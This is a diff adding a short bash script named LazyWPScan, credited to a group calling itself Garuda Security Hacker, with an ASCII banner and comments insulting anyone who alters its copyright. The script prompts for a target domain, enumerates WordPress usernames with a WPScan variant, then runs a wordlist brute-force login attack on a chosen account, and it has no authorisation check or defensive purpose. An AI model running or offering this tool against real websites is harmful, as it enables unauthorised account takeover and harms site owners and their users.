@@ -1,0 +1,48 @@
+#!/bin/bash
+#
+# Name	 	: LazyWPScan
+# Author	: Yukinoshita 47
+# Team 		: Garuda Security Hacker
+# Site 		: GarudaSecurityHacker.org
+#
+# Jika mau recode jangan ganti copyright asli nya TOLOL
+# if you want to recode it dont remove original copyright NOOB
+
+#START
+echo ""
+echo ""            
+#Copyright Banner 
+echo "  8                          8   8  8       8eeee8   "               
+echo "  8     eeeee eeeee e    e   8   8  8 eeeee 8      eeee eeeee eeeee "
+echo "  8e    8   8     8 8    8   8e  8  8 8   8 8eeeee 8  8 8   8 8   8 "
+echo "  88    8eee8 eeee8 8eeee8   88  8  8 8eee8     88 8e   8eee8 8e  8 "
+echo "  88    88  8 88      88     88  8  8 88    e   88 88   88  8 88  8 "
+echo "  88eee 88  8 88ee8   88     88ee8ee8 88    8eee88 88e8 88  8 88  8 "
+echo "  "
+echo "  "                                                               
+echo "  Coded by : Yukinoshita 47 " # Mau diGanti ? Dimana Otak Lo Anjeng  
+echo "  Team     : Garuda Security Hacker " # Change Copyright Author Isn't Make you A Coder
+echo "  Codename : The KNTL" #Only Lamer And Idiot People Change This Copyright Section
+echo "  Version  : 0.1.0" #Recode Copyright Bukan Berarti lu hebat tong sama aja kayak bocah tolol
+echo "  Site     : wpscan.org | garudasecurityhacker.org"
+echo "  Recode Copyright Are not Make You A Real Coder"
+echo "						 "
+#Enumeration Username
+echo "  Enter domain of your Target Below example site.com :"
+read TARGET
+termuxwpscan --url $TARGET --enumerate u
+#Input Username
+echo "  Enter username if you found username after enumeration :"
+read USER
+#Input Password Wordlist
+echo "  Enter your wordlist password for bruteforce attack "
+echo "  example : /root/darkc0de.lst"
+read PASS
+#Syntax brutforce
+termuxwpscan --url $TARGET --wordlist $PASS --username $USER
+#Final Result
+echo "  Done >.< if you cannot login maybe you have been lockdown"
+echo "  by Wordpress Security Plugin or Web Application Firewall"
+echo "  Thanks for using this tool and keep support"
+echo "  Garuda Security Hacker"
+#END
